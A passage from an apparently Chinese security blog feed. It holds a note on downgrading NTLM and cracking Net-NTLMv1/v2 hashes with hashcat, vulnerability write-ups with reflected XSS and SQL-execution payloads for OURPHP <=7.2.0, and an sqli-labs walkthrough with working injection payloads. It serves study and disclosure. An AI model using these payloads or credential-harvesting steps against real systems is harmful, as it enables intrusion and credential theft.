<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<p>Net-NTLMv1的格式为：<code>username::hostname:LM response:NTLM response:challenge</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator::adexx-PC:bf3d8d0c689b18f7fce20f605af5b689dadc3623865acfad:bf3d8d0c689b18f7fce20f605af5b689dadc3623865acfad:1122334455667788</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/25/NTLM%E5%8D%8F%E8%AE%AE/image-20230125140656764.png" alt="image-20230125140656764"></p>
<p>使用hashcat进行字典破解，参数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5500 hash.txt password.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/25/NTLM%E5%8D%8F%E8%AE%AE/image-20230125140710636.png" alt="image-20230125140710636"></p>
<p>优点：</p>
<p>1、这种方式不会对lsass.exe进程进行操作<br>2、同本地NTLM SSP进行交互，不会产生流量<br>3、没有进行NTLM认证，不会产生日志</p>
<p>补充：</p>
<p>Net-NTLMv2的格式<code>username::domain:challenge:HMAC-MD5:blob</code></p>
<p>如果以<strong>普通用户</strong>权限执行InternalMonologue，同样能够获得当前用户的<strong>Net-NTLMv2</strong>数据包（注意是的Net-NTLMv2的数据包，不是Net-NTLMv1，因为没有权限去进行降级到Net-NTLMv1），通过hashcat进行破解，也能获得当前用户的明文口令</p>
<p><img src="/2023/01/25/NTLM%E5%8D%8F%E8%AE%AE/image-20230125140718486.png" alt="image-20230125140718486"></p>
<p>如上图，获得Net-NTLMv2的数据包如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yuyonghu01::PENTEST:1122334455667788:bf3d8d0c689b18f7fce20f605af5b689dadc3623865acfad:bf3d8d0c689b18f7fce20f605af5b689dadc3623865acfad</span><br></pre></td></tr></table></figure>

<p>使用hashcat进行字典破解，参数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt password.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/25/NTLM%E5%8D%8F%E8%AE%AE/image-20230125140727018.png" alt="image-20230125140727018"></p>
<p>同时找资料的时候也发现了很多优秀的文章，大家复习的时候可以进行相关的借鉴。</p>
<p><a href="https://www.likecs.com/show-305718374.html#sc=749.2799682617188">Net-NTLMv1的利用-爱码网 (likecs.com)</a></p>
<p><a href="https://xz.aliyun.com/t/8562">NTLM认证相关攻击技巧（较全） - 先知社区 (aliyun.com)</a></p>
]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>OURPHP &lt;=v7.2.0 Background SQL injection</title>
    <url>/2023/03/27/OURPHP-v7-2-0-Background-SQL-injection/</url>
    <content><![CDATA[<h1 id="OURPHP-lt-v7-2-0-Background-SQL-injection"><a href="#OURPHP-lt-v7-2-0-Background-SQL-injection" class="headerlink" title="OURPHP &lt;=v7.2.0 Background SQL injection"></a>OURPHP &lt;=v7.2.0 Background SQL injection</h1><p>This function node on the website background can directly execute SQL statements, but requires a password code, which can be exploded. The default password code is 6 digits, and it will be exploded in a moment.</p>
<p><img src="/2023/03/27/OURPHP-v7-2-0-Background-SQL-injection/image-20230327084416053.png" alt="image-20230327084416053"></p>
<p>We try to execute the following statement</p>
<p><code>UPDATE ourphp_mail set OP_Mailpass=&#39;37e0c8f50a64a454&#39; WHERE id=&#39;4&#39;;</code></p>
<p><img src="/2023/03/27/OURPHP-v7-2-0-Background-SQL-injection/image-20230327084956542.png" alt="image-20230327084956542"></p>
<p>You can see that this value is currently 123456</p>
<p>Then we execute the statement，And then use burp to explode the password code</p>
<p><img src="/2023/03/27/OURPHP-v7-2-0-Background-SQL-injection/image-20230327085506377.png" alt="image-20230327085506377"></p>
<p>See the prompt that the operation was successful</p>
<p><img src="/2023/03/27/OURPHP-v7-2-0-Background-SQL-injection/image-20230327085544758.png" alt="image-20230327085544758"></p>
<p>The value has also been changed</p>
<h2 id="Code-download-address"><a href="#Code-download-address" class="headerlink" title="Code download address"></a>Code download address</h2><p><code>https://down.chinaz.com/api/index/download?id=51308&amp;type=code</code></p>
<p>Just download it and put it directly into PHPstudy</p>
]]></content>
      <categories>
        <category>-cve</category>
      </categories>
  </entry>
  <entry>
    <title>OURPHP  =v7.2.0 ourphp_out.php Reflection xss</title>
    <url>/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/</url>
    <content><![CDATA[<h1 id="OURPHP-v7-2-0-ourphp-out-php-Reflection-xss"><a href="#OURPHP-v7-2-0-ourphp-out-php-Reflection-xss" class="headerlink" title="OURPHP  =v7.2.0 ourphp_out.php Reflection xss"></a>OURPHP  =v7.2.0 ourphp_out.php Reflection xss</h1><p>Direct echo in the <code>/client/manage/ourphp_out.php</code> file, in addition to controllable variables, allows attackers to execute xss code.</p>
<p>Let’s look directly at the code as follows</p>
<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/image-20230327083656395.png" alt="image-20230327083656395"></p>
<p>If the ourphp_admin parameter is logout, we will echo a controllable variable.<br>The controllable variable is out<br>And there’s a script tag in front, just close it for him.<br>So our payload is</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/client/manage/ourphp_out.php?ourphp_admin=logout&amp;out=&lt;/script&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Vulnerability-recurrence"><a href="#Vulnerability-recurrence" class="headerlink" title="Vulnerability recurrence"></a>Vulnerability recurrence</h2><p>Let’s download the code through the following link and install it directly in PHP Study.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://down.chinaz.com/api/index/download?id=51308&amp;type=code</span><br></pre></td></tr></table></figure>

<p>After installation, directly access the following path</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/client/manage/ourphp_out.php?ourphp_admin=logout&amp;out=&lt;/script&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/image-20230327083926514.png" alt="image-20230327083926514"></p>
]]></content>
      <categories>
        <category>-cve</category>
      </categories>
  </entry>
  <entry>
    <title>OURPHP  &lt;=v7.2.0 ourphp_tz.php Reflection xss</title>
    <url>/2023/03/27/OURPHP-v7-2-0-ourphp-tz-php-Reflection-xss/</url>
    <content><![CDATA[<h1 id="OURPHP-lt-v7-2-0-ourphp-tz-php-Reflection-xss"><a href="#OURPHP-lt-v7-2-0-ourphp-tz-php-Reflection-xss" class="headerlink" title="OURPHP  &lt;=v7.2.0 ourphp_tz.php Reflection xss"></a>OURPHP  &lt;=v7.2.0 ourphp_tz.php Reflection xss</h1><p>This file appears to be a test file. If the website administrator does not delete it, there may be an xss vulnerability and some information leakage.<br>Later, I found that this file was also referenced in the background, so it is not a test file.</p>
<p>By looking at line 619 of the code in the <code>/client/manage/ourphp_tz.php</code>file, we can see that.</p>
<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-tz-php-Reflection-xss/image-20230327082422258.png" alt="image-20230327082422258"></p>
<p>If the get method passes in two parameters, an atc parameter with a value of rt and a parameter named callback, the page will directly echo the contents of our callback parameter.</p>
<p>So payload is simple, as follows</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/client/manage/ourphp_tz.php?act=rt&amp;callback=&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Vulnerability-recurrence"><a href="#Vulnerability-recurrence" class="headerlink" title="Vulnerability recurrence"></a>Vulnerability recurrence</h2><p>Let’s download the code through the following link and install it directly in PHP Study.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://down.chinaz.com/api/index/download?id=51308&amp;type=code</span><br></pre></td></tr></table></figure>

<p>After installation, directly access the following path</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/client/manage/ourphp_tz.php?act=rt&amp;callback=&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/27/OURPHP-v7-2-0-ourphp-tz-php-Reflection-xss/image-20230327083116827.png" alt="image-20230327083116827"></p>
]]></content>
      <categories>
        <category>-cve</category>
      </categories>
  </entry>
  <entry>
    <title>PHP审计练习-sql-labs</title>
    <url>/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/</url>
    <content><![CDATA[<h1 id="PHP审计练习-sql-labs"><a href="#PHP审计练习-sql-labs" class="headerlink" title="PHP审计练习-sql-labs"></a>PHP审计练习-sql-labs</h1><p>这次笔者通过代码审计的方式来通关这个sql经典靶场</p>
<h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><p>很简单的一个,直接拼上去的字符注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>payload<code>1&#39; and 1=2 union select user(),database(),1--+</code></p>
<h1 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h1><p>简单的数字注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>数字注入不需要闭合单引号，所以直接payload<code>1 and 1=2 union select 1,database(),2--+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193405777.png" alt="image-20220906193405777"></p>
<h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><p>就是加了个括号,闭合一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>payload<code>id=1&#39;) and 1=2 union select 1,database(),user()--+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193631903.png" alt="image-20220906193631903"></p>
<h1 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h1><p>加了个双引号，又加个括号，闭合一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>id=1”) and 1=2 union select 1,database(),user() –+</p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906194955582.png" alt="image-20220906194955582"></p>
<h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>单引号闭合</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>但是这是个盲注啊，<code>&#39;and 1=1 --+</code>正常，1=2就不正常了。那我们可以写脚本爆破，但是我这就不写了，我们知道数据库名字叫security，直接验证一下就好了。</p>
<p><code>id=5&#39; and substr((select database()),1,1)=&#39;s&#39; --+</code></p>
<p>substr（）函数是用来分隔字符串的</p>
<p>也就是判断数据库第一个字母是不是s的意思</p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195916896.png" alt="image-20220906195916896"></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195924510.png" alt="image-20220906195924510"></p>
<h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>闭合双引号的布尔盲注</p>
<p><code>id=5&quot; and substr((select database()),1,1)=&#39;s&#39; --+</code></p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906200049406.png" alt="image-20220906200049406"></p>
<h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>文件没写进去，用的布尔盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=5&#x27;)) and substr((select database()),1,1)=&#x27;s&#x27; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123403037.png" alt="image-20220907123403037"></p>
<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>闭合单引号的布尔盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=5&#x27; and substr((select database()),1,1)=&#x27;r&#x27; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123825007.png" alt="image-20220907123825007"></p>
<h1 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h1><p>纯不报错，用sleep盲注</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">    &#125;<span class="comment">//输入什么都是输出u are in...</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(1=1,sleep(5),1)--+   测试一下时间注入</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1%27%20and%20if(substr((select%20database()),1,1)=%27s%27,sleep(5),1)%20--+</span><br><span class="line">payload判断数据库第一个是s</span><br></pre></td></tr></table></figure>

<h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>闭合双引号的时间盲注</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1%22%20and%20if(substr((select%20database()),1,1)=%27s%27,sleep(5),1)%20--+</span><br></pre></td></tr></table></figure>

<h1 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h1><p>是经典的登录框post注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=123&amp;passwd=123&#x27;order by 2 --+&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname=123&amp;passwd=123&#x27;union select database(),3 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907125936343.png" alt="image-20220907125936343"></p>
<h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>闭合双引号和括号的post注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&quot;) union select 1,database() --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907130550018.png" alt="image-20220907130550018"></p>
<h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>用万能密码登录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">	<span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&#x27;) or 1=1 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132748740.png" alt="image-20220907132748740"></p>
<h1 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>闭合双引号的万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&quot; or 1=1 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132919741.png" alt="image-20220907132919741"></p>
<h1 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>闭合单引号的万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&#x27; or 1=1 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133135237.png" alt="image-20220907133135237"></p>
<h1 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>闭合双引号和括号的万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=-1&amp;passwd=-1&quot;) or 1=1 --+&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133338525.png" alt="image-20220907133338525"></p>
<h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>从这关开始有过滤函数了</p>
<p>感觉又有以前玩ctf的感觉了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>下面还有个passwd参数没有过滤的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row1;</span></span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		mysql_query(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>上面的过滤函数大概意思就是，看你开了自动加反斜杠没有，加了就去除，然后在下面再给你转义一次。</p>
<p>了解了一下，因为下面会输出报错语句，所以这里使用的是报错注入。</p>
<p>可以使用的有，extractvalue()报错注入，updatexml()报错注入和group by()报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&amp;passwd=231&#x27; and (extractvalue(1,concat(0x5c,database(),0x5c))) --+ &amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p>爆出数据库</p>
<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907150720242.png" alt="image-20220907150720242"></p>
